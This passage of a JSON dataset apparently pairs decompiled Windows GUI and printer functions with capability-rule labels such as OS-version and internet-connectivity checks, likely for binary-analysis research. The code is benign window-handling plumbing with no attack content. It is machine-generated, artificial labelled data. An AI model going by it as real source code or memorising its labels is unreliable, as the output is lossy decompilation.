        "decompiled_code": "\nvoid __cdecl fcn.0042dd77(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.00429937(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dd9b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 151
    },
    "0042dda1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dda1(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ddbc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x88))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042ddc2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ddc2(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ddd7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x90))();\n    return;\n}\n",
        "token_count": 126
    },
    "0042de00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042de00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        (**(**(in_ECX + 0x4c) + 0x98))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0042de3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042de3e(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042de59. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa0))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042de5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042de5f(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042de74. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa4))();\n    return;\n}\n",
        "token_count": 125
    },
    "0042de7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042de7a(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042de95. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa8))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042de9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042de9b(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n        fcn.0042b432(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042deb6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xb0))();\n    return;\n}\n",
        "token_count": 147
    },
    "0042debc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042debc(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    if (*(arg_8h + 0x4c) != 0) {\n        (**(**(arg_8h + 0x4c) + 0x60))(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &arg_20h);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0042df63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042df63(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    if ((*(param_1 + 0x4c) == 0) && (*(param_2 + 0x48) != 0)) {\n        (**(**(param_2 + 0x48) + 0x9c))(param_1, param_3);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0042df88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042df88(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x0042df93. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*param_1[1] + 0x78))();\n        return;\n    }\n    (*_sym.imp.USER32.dll_GetWindowLongA)(*param_1, 0xfffffff0);\n    return;\n}\n",
        "token_count": 114
    },
    "0042dfe6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042dfe6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (arg_18h != 0) {\n        arg_18h = *(arg_18h + 4);\n    }\n    uVar1 = (*_sym.imp.USER32.dll_ScrollWindowEx)\n                      (*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if ((*(in_ECX + 0x48) != 0) && ((arg_20h & 1) != 0)) {\n        (**(**(in_ECX + 0x48) + 0x5c))(arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 232
    },
    "0042e037": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e037(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x1c);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x1c), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042e06d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x9c))();\n    return;\n}\n",
        "token_count": 200
    },
    "0042e073": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e073(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x4c) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.00427dff(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x48) != 0)) {\n            (**(**(iVar2 + 0x48) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0042e0b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042e0b4(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    bool bVar6;\n    code *var_8h;\n    code *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        if (arg_ch == 0) {\n            var_8h = 0x443f10;\n            var_4h = 0x40ab36;\n        }\n        else {\n            var_8h = 0x42dfe1;\n            var_4h = 0x40b907;\n        }\n        arg_ch = (*var_4h)();\njoined_r0x0042e0fc:\n        do {\n            if (arg_ch == 0) {\n                return NULL;\n            }\n            ppiVar3 = (*var_8h)(&arg_ch);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto joined_r0x0042e0fc;\n                bVar6 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar6 = arg_8h == piVar1;\n            }\n        } while (!bVar6);\n        if (piVar1 != NULL) {\n            if (arg_ch == 0) {\n                arg_ch = (*var_4h)();\n            }\n            do {\n                ppiVar3 = (*var_8h)(&arg_ch);\n                piVar2 = *ppiVar3;\n                uVar5 = fcn.0042df88();\n                if (piVar2 == piVar1) {\n                    return piVar2;\n                }\n                if (((uVar5 & 0x10000) != 0) && ((uVar5 & 0x8000000) == 0)) {\n                    return piVar2;\n                }\n            } while (arg_ch != 0);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 544
    },
    "0042e190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e190(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x44);\ncode_r0x0042e1ee:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040b90b(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042e1ee;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.0040b90b(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042df88();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.0040ab3a(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.0040ab3a();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042df88();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 604
    },
    "0042e28c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e28c(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x40);\ncode_r0x0042e2ea:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040ab3a(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042e2ea;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.0040ab3a(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042df88();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.0040b90b(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.0040b90b();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042df88();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 605
    },
    "0042e388": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e388(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*(in_ECX + 0x48) == 0) {\n        return;\n    }\n    if (arg_8h == NULL) {\n        return;\n    }\n    if ((arg_8h[2] == 0) ||\n       (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*arg_8h, 0xf0, 0, 0),  puVar4 = arg_8h,  iVar2 != 1)) {\n        puVar3 = fcn.0042701c(arg_8h, 0);\n        puVar6 = &arg_8h;\n        arg_8h = puVar3;\n        fcn.0040ab3a(puVar6);\n        do {\n            if (arg_8h == NULL) {\ncode_r0x0042e42d:\n                arg_8h = puVar3;\n                fcn.0040b90b(&arg_8h, puVar6);\n                while( true ) {\n                    if (arg_8h == NULL) {\n                        return;\n                    }\n                    puVar4 = fcn.0040b90b(&arg_8h);\n                    puVar4 = *puVar4;\n                    if ((puVar4[2] != 0) && (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 == 1)) break;\n                    uVar5 = fcn.0042df88();\n                    if ((uVar5 & 0x20000) != 0) {\n                        return;\n                    }\n                }\n                break;\n            }\n            puVar6 = &arg_8h;\n            puVar4 = fcn.0040ab3a();\n            puVar4 = *puVar4;\n            uVar5 = fcn.0042df88();\n            if ((uVar5 & 0x20000) != 0) goto code_r0x0042e42d;\n        } while ((puVar4[2] == 0) || (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 != 1));\n    }\n    (*pcVar1)(*puVar4, 0xf1, 0, 0);\n    return;\n}\n",
        "token_count": 601
    },
    "0042e498": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpString2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042e498(uint lpString1, uint iMaxLength)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpString2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x1c), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        piVar2 = fcn.004290ee();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0xc));\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 417
    },
    "0042e518": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.0042e518(void)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(extraout_ECX + 0x1c));\n    }\n    else {\n        piVar2 = fcn.004290ee();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        uVar1 = *(*(unaff_EBP + -0x10) + -0xc);\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 313
    },
    "0042e6b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042e6b6(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar4;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00444bf8();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        iVar1 = *(arg_10h + 0x30);\n        arg_ch = 0;\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar4 = puVar2[1];\n            while (((piVar4[1] != 0 && (piVar4[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar4[1]) {\n                    if (iVar1 == 0) {\n                        if (*piVar4 == 0) {\ncode_r0x0042e742:\n                            *(arg_10h + 4) = piVar4[2];\n                            arg_ch = 1;\n                        }\n                    }\n                    else if ((*piVar4 != 0) && (iVar3 = fcn.0040b930(iVar1, *piVar4),  iVar3 != 0))\n                    goto code_r0x0042e742;\n                }\n                piVar4 = piVar4 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = arg_ch & 0xffff;\n        if (arg_ch_00 != 0) goto code_r0x0042e77b;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x0042e77b:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.00429ba5(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.0042e5a0(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 669
    },
    "0042ebd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ebd6(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x70) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x70));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x6c) != 0) {\n                fcn.00434c84(*(in_ECX + 0x6c));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x6c) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.00434c84(*(in_ECX + 0x6c));\n                *(in_ECX + 0x6c) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 433
    },
    "0042ed7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0042ed7e(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    uint var_ch;\n    uint var_4h_2;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    fcn.004307b5();\n    fcn.004309ad(0xffffffff);\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 8) == 0) {\n        iVar1 = fcn.00444c1e();\n        if ((iVar1 != 0) && (*(iVar1 + 0x3c) != NULL)) {\n            (**(**(iVar1 + 0x3c) + 0x60))();\n            if (*(iVar1 + 0x3c) != NULL) {\n                (**(**(iVar1 + 0x3c) + 4))(1);\n            }\n            *(iVar1 + 0x3c) = 0;\n        }\n    }\n    bVar2 = *0x466e04 != 0;\n    *(unaff_EBP + -4) = 4;\n    if (bVar2) {\n        fcn.00446527(*(unaff_EBP + 8), 0);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 375
    },
    "0042efbf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042efbf(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.00444c1e();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.0042eed3(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.0040a3cd();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[7];\n    }\n    iVar1 = fcn.0042b973(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.0042b432(*param_1);\n            piVar4 = fcn.0042c69d();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 301
    },
    "0042f0cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042f0cd(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar2 = fcn.00444c1e();\n    piVar1 = *(iVar2 + 4);\n    if (piVar1 != NULL) {\n        if (piVar1[0xe] != NULL) {\n            (*piVar1[0xe])(1, 0);\n        }\n        if (param_2 != 0) {\n            (**(*piVar1 + 0x78))();\n        }\n        *(iVar2 + 4) = 0;\n    }\n    fcn.0042ed7e(0);\n    fcn.0041242f(unaff_retaddr);\n    return;\n}\n",
        "token_count": 181
    },
    "0042f324": {
        "rules": [
